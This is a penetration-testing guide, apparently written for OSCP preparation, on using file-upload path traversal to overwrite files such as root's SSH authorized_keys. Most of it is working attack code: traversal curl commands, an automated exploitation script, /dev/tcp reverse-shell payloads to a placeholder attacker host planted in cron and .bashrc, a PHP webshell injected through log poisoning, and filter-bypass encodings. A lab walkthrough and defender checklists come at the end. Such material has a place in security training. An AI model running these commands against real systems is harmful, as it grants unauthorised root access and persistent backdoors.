# Non-Executable File Upload & Directory Traversal Exploitation Guide

## Table of Contents
1. [Discovery & Enumeration](#discovery--enumeration)
2. [Attack Vectors](#attack-vectors)
3. [SSH Key Overwrite Chain](#ssh-key-overwrite-chain)
4. [Alternative Targets](#alternative-targets)
5. [Troubleshooting](#troubleshooting)
6. [Tools & Automation](#tools--automation)
7. [Detection & Prevention](#detection--prevention)

---

## Discovery & Enumeration

### Identifying Upload Functionality
```bash
# Visual indicators to look for:
- Upload forms without file type restrictions
- "Choose File", "Browse", "Upload" buttons
- Profile picture/avatar upload
- Document/attachment uploads
- Import/Export features

# Check if PHP/ASP/JSP is disabled
curl http://TARGET:8000/index.php    # 404 = No PHP
curl http://TARGET:8000/test.aspx    # 404 = No ASP
curl http://TARGET:8000/test.jsp     # 404 = No JSP

# Identify server technology
curl -I http://TARGET:8000 | grep -i "server:"
# Look for: Python/Golang/Node.js/Ruby indicators
```

### Testing Upload Behavior
```bash
# 1. Test basic upload
echo "test" > test.txt
curl -X POST -F "file=@test.txt" http://TARGET/upload

# 2. Test duplicate upload (reveals paths/errors)
curl -X POST -F "file=@test.txt" http://TARGET/upload
# Look for: "File exists at /path/to/uploads/test.txt"

# 3. Test path traversal in filename
curl -X POST -F "file=@test.txt;filename=../test.txt" http://TARGET/upload
# Check if ../ appears in response

# 4. Check for parameter manipulation
# Common parameters: filename, name, path, dir, folder, destination
```

### Enumeration Checklist
```bash
□ Can upload without authentication?
□ File stored with original name?
□ Path/location disclosed in response?
□ Directory traversal sequences preserved?
□ Error messages reveal filesystem paths?
□ Can overwrite existing files?
□ Running as privileged user (root/admin)?
```

---

## Attack Vectors

### 1. SSH Authorized Keys Overwrite (Linux)
```bash
# Most reliable on misconfigured Linux servers
Target: /root/.ssh/authorized_keys
        /home/USERNAME/.ssh/authorized_keys
Success Rate: HIGH if running as root
```

### 2. Cron Job Injection (Linux)
```bash
# Overwrite cron files
Target: /etc/cron.d/backup
        /var/spool/cron/crontabs/root
        /etc/crontab

# Payload example
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" > cronpayload
```

### 3. Configuration File Overwrite
```bash
# Web server configs
Target: /etc/apache2/sites-enabled/000-default.conf
        /etc/nginx/sites-enabled/default
        /etc/httpd/conf.d/welcome.conf

# Application configs
Target: /app/config.py
        /var/www/html/.env
        /opt/app/settings.json
```

### 4. Library/Module Hijacking
```bash
# Python
Target: /usr/local/lib/python3.9/site-packages/random.py
        /app/lib/helper.py

# Node.js
Target: /app/node_modules/express/index.js
        /usr/lib/node_modules/npm/lib/npm.js

# Ruby
Target: /usr/local/lib/ruby/2.7.0/net/http.rb
```

### 5. Windows Specific Targets
```bash
# SSH keys (if OpenSSH installed)
Target: C:/Users/Administrator/.ssh/authorized_keys
        C:/ProgramData/ssh/administrators_authorized_keys

# Startup files
Target: C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/backdoor.bat
        C:/Users/All Users/Start Menu/Programs/Startup/backdoor.vbs

# Web configs
Target: C:/inetpub/wwwroot/web.config
        C:/xampp/apache/conf/httpd.conf
```

---

## SSH Key Overwrite Chain

### Complete Attack Flow
```bash
# 1. Generate SSH keypair
ssh-keygen -f /tmp/exploit_key -N ""
# -f: Output file path
# -N "": No passphrase (empty)

# 2. Prepare authorized_keys file
cat /tmp/exploit_key.pub > /tmp/authorized_keys

# 3. Test path traversal depth
# Try different depths until successful
for i in {1..10}; do
    path=$(python3 -c "print('../' * $i + 'root/.ssh/authorized_keys')")
    echo "Testing: $path"
    curl -X POST -F "file=@/tmp/authorized_keys;filename=$path" http://TARGET/upload
done

# 4. Connect via SSH
ssh -o StrictHostKeyChecking=no -p 2222 -i /tmp/exploit_key root@TARGET

# Alternative SSH ports to check
for port in 22 2222 2022 22022; do
    timeout 2 nc -zv TARGET $port 2>&1 | grep succeeded
done
```

### Automated Exploitation Script
```bash
#!/bin/bash
# ssh_upload_exploit.sh

TARGET=$1
PORT=${2:-22}
UPLOAD_URL="$TARGET/upload"

# Generate keys
ssh-keygen -f ./exploit_key -N "" -q

# Create authorized_keys
cp exploit_key.pub authorized_keys

# Try multiple traversal depths
for depth in 3 5 7 8 10; do
    echo "[*] Trying depth $depth..."
    path=$(perl -e "print '../' x $depth")root/.ssh/authorized_keys

    curl -s -X POST \
        -F "file=@authorized_keys;filename=$path" \
        "$UPLOAD_URL" | grep -q "Success" && {
        echo "[+] Upload succeeded at depth $depth"
        echo "[*] Attempting SSH connection..."
        ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
            -p $PORT -i exploit_key root@${TARGET##http://} \
            "id && cat /root/flag.txt 2>/dev/null || echo 'No flag in /root/'"
        break
    }
done
```

---

## Alternative Targets

### User Enumeration First
```bash
# If can't directly target root, enumerate users
# Upload to common locations and check
common_users=(www-data ubuntu admin user administrator guest)

for user in "${common_users[@]}"; do
    path="../../../../../../home/$user/.ssh/authorized_keys"
    curl -X POST -F "file=@authorized_keys;filename=$path" http://TARGET/upload
done
```

### Bashrc Poisoning
```bash
# Create malicious .bashrc
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1 2>/dev/null &' > bashrc_payload

# Upload targets
/root/.bashrc
/home/USER/.bashrc
/etc/skel/.bashrc  # Template for new users
```

### Log Poisoning Alternative
```bash
# If can read but not execute files
# Poison logs then use with LFI

# Target log files
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/mail.log

# Inject PHP via User-Agent if LFI exists
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://TARGET/
```

### Docker/Container Escapes
```bash
# Overwrite docker configurations
/var/lib/docker/containers/CONTAINER_ID/config.json
/var/lib/docker/containers/CONTAINER_ID/hostconfig.json

# Kubernetes service account
/var/run/secrets/kubernetes.io/serviceaccount/token
```

---

## Troubleshooting

### Common Issues and Solutions

| Issue | Diagnosis | Solution |
|-------|-----------|----------|
| **Upload succeeds but SSH fails** | Wrong path or permissions | Try different users, check SSH service status |
| **"Permission denied" on upload** | Web server can't write to target | Target web-writable dirs: /tmp, /var/tmp, /dev/shm |
| **Path traversal blocked** | Filter in place | Try URL encoding: `%2e%2e%2f`, double encoding, Unicode |
| **Can't find uploaded file** | Unknown storage location | Upload twice, check error messages for paths |
| **SSH key not accepted** | SSH config restrictions | Check if PubkeyAuthentication enabled, try different key types |
| **Connection refused on SSH** | Firewall or service down | Try reverse shell in authorized_keys instead |

### Advanced Bypass Techniques
```bash
# 1. Path traversal variations
..//  (stripped ../ becomes ../)
....//  (stripped ../ leaves ../)
..;/
..%2f
%2e%2e%2f
..%252f  (double URL encoded)
..%c0%af  (UTF-8 encoding)
￥ﾮ￥ﾮ/  (Unicode)

# 2. Filename bypass techniques
file=@test.txt;filename=../../etc/passwd
file=@test.txt&path=../../
file=@test.txt&folder=../../

# 3. Alternative protocols
# If HTTP blocked, try:
ftp://TARGET/upload
tftp://TARGET/upload

# 4. Content-Type manipulation
Content-Type: image/jpeg
Content-Type: text/plain
Content-Type: application/octet-stream
```

### Debugging Upload Behavior
```bash
# 1. Use Burp to inspect exact request
# 2. Try minimal request
curl -X POST \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
  --data-binary $'------WebKitFormBoundary\r\nContent-Disposition: form-data; name="file"; filename="../test.txt"\r\n\r\ntest\r\n------WebKitFormBoundary--\r\n' \
  http://TARGET/upload

# 3. Monitor server response carefully
curl -v -X POST -F "file=@test.txt" http://TARGET/upload 2>&1 | less
```

---

## Tools & Automation

### Useful Tools
```bash
# Upload fuzzer
upload-fuzzr.py --url http://TARGET/upload --wordlist paths.txt

# Path traversal tester
dotdotpwn -m http -h TARGET -x 8000 -f authorized_keys -k "ssh-" -d 8

# Automated file upload scanner
python3 fuxploider.py --url http://TARGET/upload --not-regex "Failed"

# Custom traversal generator
python3 -c "
for i in range(1,15):
    print('../' * i + 'root/.ssh/authorized_keys')
    print('..\\\\' * i + 'Users\\\\Administrator\\\\.ssh\\\\authorized_keys')
"
```

### Quick Detection Script
```python
#!/usr/bin/env python3
import requests
import sys

def test_upload_traversal(url):
    """Test if file upload has path traversal"""
    test_file = {'file': ('test.txt', 'test', 'text/plain')}

    # Test patterns
    patterns = [
        '../test.txt',
        '../../test.txt',
        '../../../tmp/test.txt',
        '..\\..\\test.txt',  # Windows
        '....//test.txt',
        '%2e%2e%2ftest.txt'
    ]

    for pattern in patterns:
        files = {'file': (pattern, 'test', 'text/plain')}
        try:
            r = requests.post(url, files=files, timeout=5)
            if '../' in r.text or '..\\' in r.text:
                print(f"[+] Possible traversal with: {pattern}")
                print(f"    Response: {r.text[:100]}")
        except:
            pass

if __name__ == "__main__":
    test_upload_traversal(sys.argv[1])
```

---

## Detection & Prevention

### For Pentesters - Confirming Success
```bash
# 1. Verify SSH key was written
ssh -v -i exploit_key root@TARGET 2>&1 | grep "Offering public key"

# 2. Check if we can write anywhere
echo "test" > /tmp/test.txt
curl -X POST -F "file=@/tmp/test.txt;filename=../../../tmp/written.txt" http://TARGET/upload
ssh TARGET "ls -la /tmp/written.txt"

# 3. Confirm privilege level
ssh -i exploit_key root@TARGET "id; whoami; pwd"
```

### For Defenders - Security Measures
```bash
# Secure upload handling checklist:
□ Sanitize filenames (remove ../ \\ : etc)
□ Use random generated filenames
□ Store uploads outside web root
□ Set strict permissions (644 for files)
□ Run web app as low-privilege user
□ Implement file type validation
□ Use chroot jail for upload directory
□ Enable SELinux/AppArmor policies
□ Monitor file system changes
□ Log all upload attempts
```

### Signs of Exploitation
```bash
# Check for suspicious files
find / -name authorized_keys -mtime -1 2>/dev/null
find / -name "*.php" -mtime -1 2>/dev/null

# Monitor SSH logins
tail -f /var/log/auth.log | grep "Accepted publickey"

# Check for unexpected cron jobs
crontab -l
ls -la /etc/cron.d/

# Audit file modifications
auditctl -w /root/.ssh/ -p wa -k ssh_changes
ausearch -k ssh_changes
```

---

## Real-World Example: Mountain Desserts

### The Successful Attack
```bash
# Context: Linux server, port 8000, no PHP execution
# Upload form at http://192.168.133.16:8000
# SSH on port 2222

# 1. Generated keys
ssh-keygen -f /tmp/fileup_key -N ""

# 2. Created authorized_keys
cat /tmp/fileup_key.pub > /tmp/authorized_keys

# 3. Exploited path traversal
curl -X POST \
  -F "myFile=@/tmp/authorized_keys;filename=../../../../../../../root/.ssh/authorized_keys" \
  http://192.168.133.16:8000/upload

# 4. Connected as root
ssh -p 2222 -i /tmp/fileup_key root@192.168.133.16

# 5. Retrieved flag
cat /root/flag.txt
# OS{64fa98d79b05b6288a00d01a13ff471f}
```

### Key Takeaways
1. **No code execution needed** - File write alone can compromise system
2. **Default configurations dangerous** - Running as root = game over
3. **Path traversal + file upload = critical** - Deadly combination
4. **Multiple services increase attack surface** - SSH on 2222 was accessible
5. **Linux servers often vulnerable** - SSH key auth is standard

---

## OSCP Exam Tips

1. **Always test non-executable uploads** - Don't give up if PHP blocked
2. **Try SSH keys first** - Highest success rate, clean access
3. **Document everything** - Screenshot uploads and SSH connections
4. **Check multiple ports** - SSH might be on non-standard ports
5. **Think about the user context** - Root? www-data? Check both
6. **Combine with other vulns** - Upload + LFI = RCE
7. **Be patient with traversal depth** - Try 3 to 15 levels deep
8. **Save your keys** - You might need them again later

---

## Quick Commands Cheatsheet

```bash
# Generate SSH keys
ssh-keygen -f key -N ""

# Test upload with traversal
curl -X POST -F "file=@authorized_keys;filename=../../../root/.ssh/authorized_keys" http://TARGET/upload

# Connect via SSH
ssh -o StrictHostKeyChecking=no -p PORT -i key root@TARGET

# One-liner to test and connect
ssh-keygen -f k -N "" -q && cat k.pub > a && curl -X POST -F "f=@a;filename=../../../../../../../root/.ssh/authorized_keys" http://TARGET/upload && ssh -p 2222 -i k root@TARGET
```